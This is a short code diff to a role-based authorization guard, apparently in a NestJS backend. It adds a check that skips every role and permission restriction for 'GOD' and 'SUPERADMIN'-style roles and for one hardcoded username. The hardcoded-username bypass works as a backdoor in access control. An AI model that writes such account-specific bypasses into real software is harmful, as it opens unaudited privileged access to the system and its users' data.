@@ -38,6 +38,28 @@ export class RolesGuard implements CanActivate {
       throw new ForbiddenException('User not found');
     }
 
+    // GOD User / SUPERADMIN check: bypass all role & permission restrictions unconditionally
+    const userRoles = [
+      user.role,
+      user.subRole,
+      user.subRole2,
+      user.subRole3,
+      user.subRole4,
+      user.subRole5,
+    ].filter(Boolean);
+
+    if (
+      user.username === 'supermuhipo' ||
+      user.role === 'GOD' ||
+      user.role === 'GOD_USER' ||
+      userRoles.includes('GOD') ||
+      userRoles.includes('GOD_USER') ||
+      userRoles.includes('SUPERADMIN') ||
+      userRoles.includes('ADMIN_IT')
+    ) {
+      return true;
+    }
+
     // Check roles
     if (requiredRoles && !this.hasRequiredRoles(user, requiredRoles)) {
       throw new ForbiddenException(
